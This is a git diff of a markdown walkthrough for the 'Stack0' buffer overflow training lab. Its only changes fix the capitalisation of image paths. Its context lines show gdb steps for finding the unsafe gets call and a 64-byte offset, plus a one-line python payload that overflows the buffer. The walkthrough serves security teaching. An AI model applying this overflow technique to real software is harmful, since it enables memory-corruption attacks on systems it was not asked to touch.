@@ -12,7 +12,7 @@ gdb ./Stack0
 
 (gdb) disassemble main
 ```
-![Breakpoint](images/BreakPointGets.png)
+![Breakpoint](Images/BreakPointGets.png)
 
 - Scan for call to `gets`/`strcpy`/`fgets` (whichever unsafe function used).
 - Note its address, say `0x080491a6`.
@@ -34,7 +34,7 @@ gdb ./Stack0
 (gdb) print &buffer        # start of buffer
 (gdb) print &modified      # or &return_addr slot
 ```
-![Disas](images/GDBdisas.png)
+![Disas](Images/GDBdisas.png)
 
 This gives you the number of filler bytes you need to reach `target` (whether it’s a local var or saved RIP/EIP).
 
@@ -43,11 +43,11 @@ This gives you the number of filler bytes you need to reach `target` (whether it
 (gdb) print (char*)&modified - (char*)&buffer #will find exact offset
 64
 ```
-![Offset](images/OffsetStack0.png)
+![Offset](Images/OffsetStack0.png)
 
 7. **Craft payload and execute**
 
 ```bash
 python3 -c 'print("A"*64 + "B")' | ./Stack0
 ```
-![Success](images/Success.png)
+![Success](Images/Success.png)
